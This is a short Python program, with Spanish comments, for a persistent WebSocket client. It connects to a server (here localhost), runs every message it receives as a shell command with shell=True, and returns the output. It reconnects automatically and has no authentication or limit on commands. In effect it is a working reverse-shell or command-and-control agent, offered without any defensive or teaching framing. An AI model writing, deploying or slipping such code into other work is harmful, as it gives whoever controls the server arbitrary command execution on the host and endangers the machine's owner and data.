import asyncio
import websockets
import subprocess
import logging

logging.basicConfig(level=logging.INFO)

class WebSocketClient:
    def __init__(self, uri):
        self.uri = uri

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri) as websocket:  # Use SSL for encrypted communication
                    logging.info("Connected to the server")
                    await self.handle_messages(websocket)
            except websockets.ConnectionClosed:
                logging.error("Connection closed, retrying in 2 seconds...")
                await asyncio.sleep(2)
            except Exception as e:
                logging.error(f"Error: {e}")
                break

    async def handle_messages(self, websocket):
        while True:
            command = await websocket.recv()
            logging.info(f"Received command: {command}")
            # Ejecutar el comando recibido
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            # Enviar la salida o el error al servidor
            await self.send_response(websocket, result)
    async def send_response(self, websocket, result):
        # Enviar stdout si hay algo que enviar
        if result.stdout:
            await websocket.send(f"Output: {result.stdout}")
            logging.info(f"Sent output to server: {result.stdout}")
        # Enviar stderr si hay error
        if result.stderr:
            await websocket.send(f"Error: {result.stderr}")
            logging.info(f"Sent error to server: {result.stderr}")
    async def run(self):
        await self.connect()

if __name__ == "__main__":
    # Asegúrese de utilizar ws o wss según la configuración del servidor
    client = WebSocketClient("ws://localhost:8000/ws")
    asyncio.run(client.run())
